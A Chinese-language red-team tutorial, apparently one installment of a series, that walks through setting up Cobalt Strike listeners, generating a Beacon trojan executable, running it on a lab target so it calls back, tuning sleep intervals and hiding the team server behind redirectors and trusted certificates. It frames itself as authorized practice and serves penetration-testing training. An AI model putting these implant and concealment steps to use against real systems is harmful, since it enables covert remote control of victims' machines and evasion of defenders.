---
title: CS 监听器与 Beacon 上线：让目标"亮"起来
description: 手把手走通 Cobalt Strike 的第一步——创建 HTTP/HTTPS listener 定义 Beacon 回连方式，用 Attacks 生成 Beacon 木马，在授权靶机上运行使其上线，并理解 Beacon 的心跳（sleep/checkin）与基本交互方式。
category: security
subcategory: cs
tags: ['Cobalt Strike', 'listener', 'Beacon', '上线', 'heartbeat']
pubDate: 2026-07-19
updatedDate: 2026-07-19
order: 2
---

上篇你认识了 CS 的架构。这一篇动手做最关键的"第一步"：先建一个 **listener（监听器）**告诉 Beacon 该往哪连，再用它生成一个 **Beacon** 木马，放到目标上让它"上线"。只要看到目标出现在 Beacon 列表里，你就真正"接上了"这台机器。

> 本文所有生成与上线操作仅用于你对**自有或已授权**的靶机。向未授权系统投放 Beacon 属违法。

## 第一步：建一个 HTTP listener

Listener 定义 Beacon 的回连方式。最入门的是 **HTTP listener**（明文，练习用；真实对抗用 HTTPS）。在 CS 客户端里：

1. 顶部菜单 **Cobalt Strike → Listeners**（或快捷键）。
2. 点 **Add**，类型选 `windows/beacon_http`（或 `beacon_https`）。
3. 填关键字段：
   - **Name**：给 listener 起个名，如 `http-listener-1`。
   - **Host**：Team Server 的 IP（Beacon 要连回来的地址）。
   - **Port**：监听端口，如 `80` 或 `8443`（练习随意，真实用 80/443 更隐蔽）。
   - **Beacon 相关**：`HTTP Host`、`HTTP Port` 一般同 Host/Port；`HTTP Channel` 可留默认。
4. 点 **Save**，listener 就建好了。

建好后，CS 会在 Team Server 上起一个对应端口的 web 服务，专门等 Beacon 来回连。

```text
# 概念对应（CS 里是图形填表，本质就是这些参数）
Host   = Team Server IP   # Beacon 回连目标
Port   = 监听端口          # Beacon 回连端口
Type   = beacon_http      # 用 HTTP 协议回连
```

## 第二步：生成 Beacon 木马

有了 listener，就可以生成"会回连到它"的 Beacon 了：

1. 顶部 **Attacks → Packages → Windows Executable**（或 `Windows Executable (S)` 签名的）。
2. 在弹出框里：
   - **Listener**：选刚建的 `http-listener-1`。
   - **Output type**：`exe`（x64 选 `x64`，按目标架构）。
   - 其他默认。
3. 点 **Generate**，选保存路径，得到 `artifact.exe`（这就是 Beacon 木马）。

这个 `artifact.exe` 里硬编码了"回连到 http-listener-1 的 Host:Port"。你在目标机器上运行它，它就会按心跳回连 Team Server。

> 提示：真实环境里这 exe 会被杀软秒杀。免杀（编码、分离、加壳）我们放在"内网渗透·免杀基础"讲；本篇先跑通流程，用关了杀软的练习靶机即可。

## 第三步：让 Beacon 上线

把 `artifact.exe` 弄到目标靶机（练习环境可用共享文件夹、U 盘、或直接拷贝），**双击运行**。几秒后，回到 CS 客户端：

- 左侧 **Targets** 列表出现这台主机；
- 底部 **Beacon** 控制台出现一个新条目，状态从 `initializing` 变成 `connected`，并显示 `sleep 60`（默认每 60 秒回连一次）。

恭喜，Beacon **上线**了。从这一刻起，这台机器就在你的控制下了。

## 理解 Beacon 的心跳：sleep 与 checkin

Beacon 不是一直连着 Team Server，而是**睡一会儿、醒一次、领任务、回结果、再睡**。这套机制叫心跳：

- **sleep**：两次回连的间隔（秒）。默认 60。值越小越实时（你下命令很快有响应），但流量越频繁越容易被发现；值越大越隐蔽但越"慢半拍"。
- **checkin**：Beacon "醒过来"回连一次的动作。

你可以随时调 sleep，平衡实时性与隐蔽性：

```text
# 在 Beacon 交互框输入（CS 里点 Beacon 再在底部输入）
sleep 10        # 改成每 10 秒回连（更实时）
sleep 300       # 改成每 5 分钟（更隐蔽）
```

练习机随意；真实对抗里，sleep 设置是隐蔽性的重要杠杆。

## 基本交互：怎么给 Beacon 下命令

Beacon 上线后，选中它（点一下），底部输入框就能敲命令。CS 的 Beacon 命令和 cmd/powershell 不同，是 CS 自己的指令集，常用前缀：

- 直接敲 `命令` 多是 Beacon 内置指令（如 `sleep`、`getuid`）。
- 想跑系统 cmd，用 `shell <命令>`（如 `shell whoami`）。
- 想跑 PowerShell，用 `powershell <脚本>`。

```text
beacon> getuid          # 看当前权限
beacon> shell whoami    # 用 cmd 执行 whoami
beacon> sleep 30        # 调心跳
```

下一篇我们会系统过 Beacon 的常用命令。这里先体验"上线 + 下一条命令有回显"的快感。

## 常见新手坑

- **listener 的 Host 填错**：填成客户端本机 IP，Beacon 在目标上连不回来。Host 必须是**目标能路由到的 Team Server IP**。
- **靶机杀软直接删 exe**：练习机先关杀软，或换更隐蔽的生成方式；真实免杀见后续章节。
- **sleep 太长以为没上线**：设了 300 还在等，其实 Beacon 在睡，耐心等一个周期或临时 `sleep 5` 看反应。
- **忘了 Beacon 要"运行"**：生成 exe 不等于上线，得在目标上真正执行它。

## 进阶：listener 的实战配置细节

练熟 HTTP listener 后，真实场景常要更讲究：

- **HTTPS listener**：用 443 + 合法证书，流量加密且伪装成正常 HTTPS 浏览，比 HTTP 难检测。CS 支持上传证书（`Cobalt Strike → Listeners` 里配 `HTTPS Cert`）。
- **DNS listener**：在极端受限网络（只允许 DNS 出网）用 DNS 回连，极慢但能穿透。适合"最后手段"而非常规。
- **Host 与"重定向器"**：真实对抗里 Team Server IP 不该直接暴露给 Beacon。常用**重定向器**（一台前置服务器做流量转发），Beacon 连重定向器域名，重定向器再转 Team Server——这样封掉前置也不暴露真身。
- **多个 listener 并存**：可同时建 http/https/dns 多个，Beacon 用 `spawn` 在不同 listener 间切换，提高存活。

这些配置的本质都是"**让 Beacon 的回连更隐蔽、更抗封锁**"，是 CS 实战的核心技巧。

## 实战：从建 listener 到上线的端到端演示

把前两篇的动作连成一次完整流水（练习环境）：

```text
# 1) 客户端建 HTTP listener
Cobalt Strike → Listeners → Add
  Name: http-1
  Host: 192.168.1.5        # Team Server IP（靶机能连到）
  Port: 8080
  Type: windows/beacon_http
Save

# 2) 生成 Beacon
Attacks → Packages → Windows Executable
  Listener: http-1
  Output: x64 → exe
  保存为 artifact.exe

# 3) 把 artifact.exe 拷到靶机（练习：虚拟机共享/拖拽）并双击运行

# 4) 客户端 Beacon 列表出现新条目，状态 connected，sleep 60
# 5) 选中它，底部输入：
beacon> getuid        # 确认当前用户
beacon> sleep 10      # 临时调快，方便操作
```

排错要点：若没上线，检查三处——listener 的 Host 是否是靶机可路由到的 Team Server IP；靶机能否 `telnet 192.168.1.5 8080` 通；杀软是否删了 exe（练习机先关）。这三处覆盖 90% 的"不上线"问题。

## Listener 故障速查表

Beacon 不上线，90% 问题在这张表里：

| 现象 | 可能原因 | 排查/修复 |
|------|----------|-----------|
| 客户端根本连不上 Team Server | Team Server 没起 / 端口不通 | 服务器 `./teamserver` 是否在跑；`telnet IP 50050` 通不通 |
| Beacon 生成了但不上线 | listener 的 Host 填错 | Host 必须是**靶机能路由到**的 Team Server IP，不是 127.0.0.1 |
| 能生成但目标运行无反应 | 靶机到 Team Server 网络不通 | 靶机 `telnet TeamServerIP Port` 测试；检查防火墙/出网策略 |
| 上线几秒就掉 | 漏洞进程退出 / 未迁移 | 上线后尽快 `inject`/`spawn` 到稳定进程 |
| 杀软直接删 exe | 未免杀 | 练习机关 Defender；真实需免杀（见内网篇） |

记住核心：**listener 的 Host 是靶机视角的回连地址**，这是新手最常填错的地方。

## Listener 与"重定向器"再聊

前面提过真实对抗要用重定向器，这里再展开一点。直接让 Beacon 连 Team Server 的裸 IP 有两个问题：一是 IP 暴露，被溯源就端掉真身；二是单点，IP 一封就失联。

**重定向器（Redirector）** 是一台前置服务器（常是云主机），它只做流量转发：Beacon 连重定向器的域名（如 `update.公司名.com`，看起来像正常业务），重定向器再把流量转给真正的 Team Server。好处：

- **隐藏真身**：蓝队看到的是重定向器，Team Server IP 不暴露。
- **可替换**：重定向器被封，换一台新的、改 DNS 即可，Beacon 改连新域名，Team Server 不动。
- **更像正常流量**：配 HTTPS + 可信证书 + 正常域名，流量混入业务浏览。

这是 CS 实战的"标准姿势"，理解它你才明白为什么前面强调"别裸 IP 直连"——那不是折腾，是生存必需。

## 速记：上线三要素

Beacon 能不能上线，看三要素：

1. **Listener（host + port）**：Beacon 回连的地址，host 必须是靶机视角能连到的 Team Server IP。
2. **Beacon 木马**：用对应 listener 生成，里面硬编码了回连地址。
3. **靶机运行**：把木马弄到目标上并真正执行。

三要素任一缺，都不上线。新手最常栽在第 1 条——host 填成 127.0.0.1 或客户端 IP，靶机连不回来。记住：**host 是靶机连 Team Server 的地址，不是你本机。**

## 小结

监听器建好可以复用，不必每次生成 Beacon 都新建；多个 Beacon 也能共用同一个 listener。但真实对抗里，建议按"行动阶段"或"目标组"分多个 listener，便于隔离管理和在单个被封时不影响其他。核心始终那句：**listener 的 host 是靶机视角能连到的 Team Server 地址**，配错就全盘不上线。

## 常见误区

- **"一个 listener 用到底"**：真实场景常备多种 listener 做冗余，单点被封就失联。
- **"HTTPS 一定比 HTTP 安全"**：没配真证书、自签证书的 HTTPS 仍可被识别，要配可信证书。
- **"重定向器多此一举"**：直接暴露 Team Server IP 是红队大忌，前置重定向器是基本操作。
- **"sleep 设 0 最实时"**：实时但特征明显，真实场景要权衡隐蔽。

## 自测题

1. 建 HTTP listener 必须填哪两个关键字段？Beacon 怎么知道往哪连？
2. 为什么真实对抗推荐 HTTPS + 合法证书而非裸 HTTP？
3. 什么是"重定向器"？为什么不直接暴露 Team Server IP？
4. sleep 大小对隐蔽性和实时性各有什么影响？

## 这一篇你该记住的

- 流程：**建 listener（定义回连方式）→ 生成 Beacon（硬编码回连）→ 目标运行 → 上线**。
- HTTP listener 填 `Host`(Team Server IP) + `Port`；Beacon 按心跳回连它。
- 生成入口：`Attacks → Packages → Windows Executable`，选 listener 与架构（x64/x86）。
- Beacon 是"睡醒制"：**sleep** 控制回连间隔，越小越实时越大越隐蔽。
- 交互：选中 Beacon 在底部输入；`shell <cmd>` 跑系统命令，`getuid` 看权限。

下一篇我们系统过一遍 **Beacon 的常用命令**——`shell`/`powershell`/`getsystem`/`screenshot`/`hashdump` 这些日常操作，以及怎么把 Beacon 会话"派生"到 Metasploit，让两个框架联手。